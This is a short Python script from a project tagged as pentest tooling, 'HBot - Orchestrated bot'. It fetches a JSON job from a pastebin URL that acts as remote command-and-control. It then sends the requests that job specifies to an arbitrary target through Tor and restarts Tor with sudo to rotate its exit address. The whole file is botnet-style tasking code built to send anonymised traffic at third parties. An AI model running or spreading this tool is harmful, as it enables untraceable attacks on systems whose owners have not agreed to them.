##
# HBot - Orchestrated bot
#
# @package intrd/pentest-hbot
# @version 
# @tags pentest, bot, eggdrop, pyton, bash
# @link http://github.com/intrd/pentest-hbot
# @author intrd (Danilo Salles) - http://dann.com.br
# @copyright (CC-BY-SA-4.0) 2016, intrd
# @license Creative Commons Attribution-ShareAlike 4.0 - http://creativecommons.org/licenses/by-sa/4.0
# Dependencies: 
# - python >=2.7.0
## @docbloc 1.1

import requests
import sys
import json
#from get_proxy import get_proxies
import os

#proxy = get_proxies()
tor = {'http': "socks5://127.0.0.1:9050"}

url = 'http://pastebin.com/raw/eWTznEe5'
data = requests.get(url)
pyload = json.loads(data.content)

if pyload["enabled"]=="1":
	r = requests.session()
	r = requests.get(pyload["targ"], data=json.dumps(pyload["postdata"]), headers=pyload["header"], proxies=tor, timeout=10)
	print("code: "+str(r.status_code))
	print(r.headers)
	print dict(r.cookies) 
	print(r.content)

	o=os.popen('sudo service tor restart')
	o=o.read()
	# o=os.popen('./tor_restart.sh')
	# o=o.read()
	print o

